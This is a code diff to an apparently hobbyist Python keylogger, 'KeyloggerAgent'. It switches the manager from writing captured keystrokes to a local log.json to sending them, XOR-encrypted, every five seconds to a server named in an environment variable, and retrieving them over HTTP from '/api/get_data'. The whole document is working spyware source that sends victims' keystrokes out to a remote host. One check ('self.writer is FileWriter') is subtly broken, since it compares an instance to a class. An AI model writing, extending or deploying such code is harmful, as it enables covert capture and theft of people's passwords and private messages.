@@ -1,17 +1,22 @@
 import time
-from KeyloggerAgent.Write import IWriter, FileWriter
+from KeyloggerAgent.Write import IWriter, FileWriter , NetworkWriter
 from KeyloggerAgent.KeyloggerService import KeyLoggerService
 from KeyloggerAgent.Encryption import XOREncryption
+from dotenv import load_dotenv
+import os
+import requests
 
-
+load_dotenv()
+password = os.environ.get('PASSWORD')
+server_name = os.environ.get('SERVER_NAME')
 
 
 class KeyLoggerManager:
 
     def __init__(self):
         self.service = KeyLoggerService()
-        self.writer = FileWriter()
-        self.__encryption = XOREncryption('0988977872186763')
+        self.writer = NetworkWriter()
+        self.__encryption = XOREncryption(password)
 
     def start_listening(self):
         """
@@ -23,7 +28,7 @@ class KeyLoggerManager:
         while True:
             time.sleep(5)
             data = self.service.get_data()
-            self._writer(self.writer , self.encrypt(data),'log.json')
+            self._writer(self.writer , self.encrypt(data),server_name)
 
     def stop_listening(self):
         """
@@ -51,15 +56,19 @@ class KeyLoggerManager:
         Takes an encrypted json file
          and returns an unencrypted dictionary
         """
-        temp_dict = dict()
-        data = self.writer.load('log.json')
-        for mac, user_dict in data.items():
-            temp_dict[mac] = dict()
-            for window, data_dict in user_dict.items():
-                temp_dict[mac][window] = dict()
-                for timestamp, data_keys in data_dict.items():
-                    temp_dict[mac][window][timestamp] = self.__encryption.decrypt(data_keys)
-        return temp_dict
+        if self.writer is FileWriter:
+            temp_dict = dict()
+            data = self.writer.load('log.json')
+            for mac, user_dict in data.items():
+                temp_dict[mac] = dict()
+                for window, data_dict in user_dict.items():
+                    temp_dict[mac][window] = dict()
+                    for timestamp, data_keys in data_dict.items():
+                        temp_dict[mac][window][timestamp] = self.__encryption.decrypt(data_keys)
+            return temp_dict
+        else:
+            return requests.get(f"http://{server_name}/api/get_data")
+
     @staticmethod
     def _writer(write:IWriter, data:dict, name:str):
         """
